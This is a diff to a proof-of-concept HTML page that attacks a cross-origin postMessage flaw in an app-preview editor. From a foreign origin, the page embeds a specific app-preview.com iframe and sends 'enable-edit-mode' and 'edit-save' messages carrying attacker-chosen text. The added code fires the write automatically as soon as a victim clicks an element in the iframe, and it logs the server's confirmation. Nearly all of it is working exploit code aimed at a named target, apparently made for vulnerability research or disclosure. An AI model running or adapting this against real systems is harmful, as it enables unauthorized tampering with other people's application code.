@@ -7,6 +7,8 @@
     #log { background: #000; padding: 10px; height: 200px; overflow-y: auto; border: 1px solid #0f0; }
     iframe { width: 100%; height: 500px; border: 2px solid red; }
     button { background: #0f0; color: #000; border: none; padding: 8px 16px; margin: 4px; cursor: pointer; font-weight: bold; }
+    #attacker-text { background: #000; color: #f90; border: 1px solid #f90; padding: 6px 10px; font-family: monospace; font-size: 14px; width: 400px; }
+    label { color: #aaa; font-size: 13px; }
   </style>
 </head>
 <body>
@@ -14,13 +16,20 @@
   <p>Origin of THIS page: <strong id="origin"></strong></p>
   <p>Target iframe: <strong>https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com</strong></p>
 
+  <p>
+    <label>Attacker payload (newText): </label><br>
+    <input id="attacker-text" type="text" value="PWNED BY ATTACKER — postMessage no origin check" />
+  </p>
+
   <div>
     <button onclick="sendMsg('enable-edit-mode')">1. Send enable-edit-mode</button>
-    <button onclick="sendMsg('enableSelectionMode')">2. Send enableSelectionMode</button>
-    <button onclick="sendEditSave()">3. Send edit-save</button>
-    <button onclick="sendMsg('disable-edit-mode')">4. Send disable-edit-mode</button>
-    <button onclick="sendAll()">RUN ALL (auto)</button>
+    <button onclick="sendEditSave()">2. Send edit-save manually</button>
+    <button onclick="resetIframe()">↺ Reset iframe</button>
   </div>
+  <p style="color:#888;font-size:13px;">
+    → Click <b>1</b>, then click any text element in the iframe below.<br>
+    → The page will auto-fire <b>edit-save</b> the moment <b>editEnter</b> is received (exactly like Horizons does).
+  </p>
 
   <div id="log"></div>
 
@@ -29,50 +38,74 @@
   <script>
     document.getElementById('origin').textContent = window.location.origin;
 
+    const logEl = document.getElementById('log');
+    const iframe = document.getElementById('target');
+    const TARGET = 'https://8f07ab61-4993-4c92-87a6-32869d1ca162.app-preview.com/';
+
     const log = (msg) => {
-      const el = document.getElementById('log');
-      const ts = new Date().toISOString().split('T')[1].slice(0,8);
-      el.innerHTML += `[${ts}] ${msg}<br>`;
-      el.scrollTop = el.scrollHeight;
+      const ts = new Date().toISOString().split('T')[1].slice(0, 12);
+      logEl.innerHTML += `[${ts}] ${msg}<br>`;
+      logEl.scrollTop = logEl.scrollHeight;
       console.log('[POC]', msg);
     };
 
-    const iframe = document.getElementById('target');
+    function getPayload() {
+      return document.getElementById('attacker-text').value;
+    }
 
     function sendMsg(type, payload) {
-      const msg = payload ? { type, payload } : { type };
+      const msg = payload !== undefined ? { type, payload } : { type };
       iframe.contentWindow.postMessage(msg, '*');
-      log(`SENT → type="${type}" payload=${JSON.stringify(payload || null)}`);
+      log(`SENT → type="${type}" payload=${JSON.stringify(payload ?? null)}`);
     }
 
     function sendEditSave() {
-      // Send edit-save - triggers handleEditSave() → POST /api/apply-edit
-      sendMsg('edit-save', { newText: 'PWNED BY ATTACKER - postMessage no origin check' });
+      sendMsg('edit-save', { newText: getPayload() });
     }
 
-    function sendAll() {
-      log('--- Starting attack sequence ---');
-      setTimeout(() => sendMsg('enable-edit-mode'), 500);
-      setTimeout(() => sendMsg('enableSelectionMode'), 1500);
-      setTimeout(() => sendEditSave(), 3000);
-      setTimeout(() => {
-        log('--- Sequence complete. Check /api/apply-edit in network tab ---');
-      }, 3500);
+    function resetIframe() {
+      log('--- Resetting iframe ---');
+      iframe.src = TARGET + '?t=' + Date.now();
     }
 
-    // Listen for any messages coming BACK from the iframe
+    // ── Mirror what Horizons does:
+    // 1. Receive editEnter  → immediately send edit-save (attacker controls newText)
+    // 2. Receive editApplied → log success
     window.addEventListener('message', (event) => {
-      if (event.origin.includes('app-preview')) {
-        log(`RECEIVED ← origin="${event.origin}" type="${event.data?.type}" data=${JSON.stringify(event.data).slice(0,200)}`);
+      if (!event.origin.includes('app-preview')) return;
+
+      const type = event.data?.type || event.data?.message;
+      log(`RECEIVED ← origin="${event.origin}" type="${type}" data=${JSON.stringify(event.data).slice(0, 200)}`);
+
+      // editEnter: victim clicked an element, currentEditingInfo is now set in the iframe
+      // Horizons responds with edit-save — so do we
+      if (type === 'editEnter') {
+        const currentText = event.data?.payload?.currentText;
+        log(`>>> editEnter! currentText="${currentText}" — auto-firing edit-save now`);
+        // Small delay to match Horizons behaviour
+        setTimeout(() => sendMsg('edit-save', { newText: getPayload() }), 200);
+      }
+
+      // editApplied: server confirmed the write
+      if (type === 'editApplied') {
+        const editId = event.data?.payload?.editId;
+        const after  = event.data?.payload?.afterCode?.trim().slice(0, 80);
+        log(`>>> SUCCESS — editApplied! editId="${editId}"`);
+        log(`>>> afterCode preview: ${after}`);
+      }
+
+      // HMR reload after edit
+      if (type === 'route-changed') {
+        log('--- route-changed: iframe reloaded (HMR). Click ↺ Reset then redo step 1. ---');
       }
     });
 
     iframe.addEventListener('load', () => {
-      log('iframe loaded ✓ — ready to send messages');
+      log('iframe loaded ✓ — origin of THIS page: ' + window.location.origin);
+      log('NOT in ALLOWED_PARENT_ORIGINS — edit-save handler has no origin check');
     });
 
-    log('PoC loaded. Iframe embedding app-preview from foreign origin.');
-    log('This origin is NOT in ALLOWED_PARENT_ORIGINS — but edit-save has no check!');
+    log('PoC ready.');
   </script>
 </body>
 </html>
